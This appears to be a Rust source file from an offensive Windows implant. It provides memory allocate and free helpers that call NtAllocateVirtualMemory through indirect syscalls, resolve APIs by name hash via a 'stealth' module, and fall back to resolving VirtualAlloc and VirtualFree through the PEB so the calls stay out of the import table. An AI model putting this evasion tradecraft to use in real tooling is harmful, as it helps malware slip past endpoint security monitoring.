// NtAllocateVirtualMemory / NtFreeVirtualMemory helpers (no HeapAlloc IAT).

use super::process::CURRENT_PROCESS;
use crate::stealth;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;

/// Allocate RW private memory via NtAllocateVirtualMemory → D/Invoke → VirtualAlloc PEB.
/// Optionally zero-fills the region.
pub fn nt_alloc_rw(size: usize, zero: bool) -> Result<*mut u8, String> {
    if size == 0 {
        return Err("zero size".into());
    }

    let mut base: usize = 0;
    let mut region = size;
    let status = unsafe {
        crate::syscalls::indirect_syscall(
            stealth::hash_api_name(b"NtAllocateVirtualMemory"),
            &[
                CURRENT_PROCESS,
                &mut base as *mut usize as usize,
                0,
                &mut region as *mut usize as usize,
                (MEM_COMMIT | MEM_RESERVE) as usize,
                PAGE_READWRITE as usize,
            ],
        )
    };

    if status >= 0 && base != 0 {
        let ptr = base as *mut u8;
        if zero {
            unsafe {
                std::ptr::write_bytes(ptr, 0, size);
            }
        }
        return Ok(ptr);
    }

    // Win32 VirtualAlloc PEB fallback
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        let addr = stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualAlloc")).ok_or_else(
            || {
                format!(
                    "NtAllocateVirtualMemory 0x{:08X}; VirtualAlloc unresolved",
                    status as u32
                )
            },
        )?;
        type VirtualAllocFn = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;
        let va: VirtualAllocFn = std::mem::transmute(addr);
        let ptr = va(
            std::ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if ptr.is_null() {
            return Err(format!(
                "NtAllocateVirtualMemory 0x{:08X}; VirtualAlloc failed",
                status as u32
            ));
        }
        if zero {
            std::ptr::write_bytes(ptr, 0, size);
        }
        Ok(ptr)
    }
}

/// Free a region previously obtained from `nt_alloc_rw`.
pub fn nt_free(ptr: *mut u8) {
    if ptr.is_null() {
        return;
    }
    let mut base = ptr as usize;
    let mut region: usize = 0;
    let status = unsafe {
        crate::syscalls::indirect_syscall(
            stealth::hash_api_name(b"NtFreeVirtualMemory"),
            &[
                CURRENT_PROCESS,
                &mut base as *mut usize as usize,
                &mut region as *mut usize as usize,
                MEM_RELEASE as usize,
            ],
        )
    };
    if status >= 0 {
        return;
    }
    unsafe {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if let Some(addr) = stealth::get_api_addr(k32, stealth::hash_api_name(b"VirtualFree")) {
            type VirtualFreeFn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
            let vf: VirtualFreeFn = std::mem::transmute(addr);
            let _ = vf(ptr, 0, MEM_RELEASE);
        }
    }
}
